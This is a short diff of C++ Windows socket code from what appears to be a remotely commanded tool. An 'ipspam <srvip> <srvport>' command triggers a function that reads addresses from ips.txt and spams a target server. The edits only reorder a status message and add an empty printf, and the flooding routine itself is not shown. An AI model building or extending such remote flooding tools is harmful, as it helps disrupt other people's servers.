@@ -446,7 +446,10 @@ void SpamIPs(const char *IP, int Port)
 {
 	std::ifstream File("ips.txt");
 	if(!File)
+	{
+		printf("");
 		return;
+	}
 
 	if (!Create(&m_Sock[0]))
 		Close(0);
@@ -645,10 +648,9 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			{
 				if(aCmd[1][0] && aCmd[2][0])
 				{
+					send(g_Client, "[Server]: IP-spam sent successfully!", strlen("[Server]: IP-spam sent successfully!"), 0);
 					int Port = atoi(aCmd[2]);
 					SpamIPs(aCmd[1], Port);
-
-					send(g_Client, "[Server]: IP-spam sent successfully!", strlen("[Server]: IP-spam sent successfully!"), 0);
 				}
 				else
 					send(g_Client, "[Server]: Please use: ipspam <srvip> <srvport>", strlen("[Server]: Please use: ipspam <srvip> <srvport>"), 0);
